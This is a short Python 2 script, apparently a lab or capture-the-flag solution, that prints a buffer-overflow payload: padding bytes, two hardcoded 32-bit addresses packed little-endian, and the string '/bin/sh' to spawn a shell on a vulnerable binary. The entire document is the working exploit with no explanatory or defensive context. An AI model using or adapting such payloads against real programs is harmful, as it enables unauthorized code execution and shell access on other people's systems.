from shellcode import shellcode
from struct import pack

shell = ("/bin/sh")

print '\xaa'*22+pack("<I", 0x0804a037)+'\xaa'*16+pack("<I", 0xbffea484)+shell